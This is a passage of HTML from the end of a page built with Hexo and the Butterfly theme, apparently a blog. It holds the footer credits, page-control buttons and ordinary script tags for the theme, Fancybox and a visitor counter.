data-lastPushDate="2024-01-09T11:32:50.212Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
